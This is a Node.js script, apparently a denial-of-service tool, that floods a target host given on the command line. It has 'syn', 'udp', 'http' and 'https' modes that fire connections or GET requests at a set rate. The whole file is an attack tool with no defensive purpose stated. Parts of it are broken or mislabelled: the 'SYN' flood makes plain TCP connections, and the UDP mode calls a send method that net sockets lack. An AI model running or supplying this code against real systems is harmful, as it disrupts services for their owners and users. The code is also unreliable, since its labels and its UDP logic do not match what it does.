const net = require('net');
const http = require('http');
const https = require('https');

const target = process.argv[2];
const attackType = process.argv[3];
const rateLimit = parseInt(process.argv[4], 10) || 100;

function synFlood(target, rateLimit) {
    const client = new net.Socket();
    client.connect(80, target, () => {
        client.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
    });

    client.on('data', (data) => {
        console.log('Received: ' + data);
        client.destroy();
    });

    client.on('close', () => {
        console.log('Connection closed');
    });

    client.on('error', (err) => {
        console.error('Error: ' + err.message);
    });

    setInterval(() => {
        const client = new net.Socket();
        client.connect(80, target, () => {
            client.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
        });

        client.on('data', (data) => {
            console.log('Received: ' + data);
            client.destroy();
        });

        client.on('close', () => {
            console.log('Connection closed');
        });

        client.on('error', (err) => {
            console.error('Error: ' + err.message);
        });
    }, 1000 / rateLimit);
}

function udpFlood(target, rateLimit) {
    const message = new Buffer('flood');
    const client = new net.Socket('udp4');

    setInterval(() => {
        client.send(message, 0, message.length, 80, target, (err) => {
            if (err) {
                console.error('Error: ' + err.message);
            } else {
                console.log('Sent UDP packet');
            }
        });
    }, 1000 / rateLimit);
}

function httpFlood(target, rateLimit) {
    setInterval(() => {
        const req = http.request({
            hostname: target,
            port: 80,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.on('data', (chunk) => {
                console.log('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            console.error('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

function httpsFlood(target, rateLimit) {
    setInterval(() => {
        const req = https.request({
            hostname: target,
            port: 443,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.on('data', (chunk) => {
                console.log('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            console.error('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

function startAttack(target, attackType, rateLimit) {
    switch (attackType) {
        case 'syn':
            synFlood(target, rateLimit);
            break;
        case 'udp':
            udpFlood(target, rateLimit);
            break;
        case 'http':
            httpFlood(target, rateLimit);
            break;
        case 'https':
            httpsFlood(target, rateLimit);
            break;
        default:
            console.error('Invalid attack type');
    }
}

startAttack(target, attackType, rateLimit);
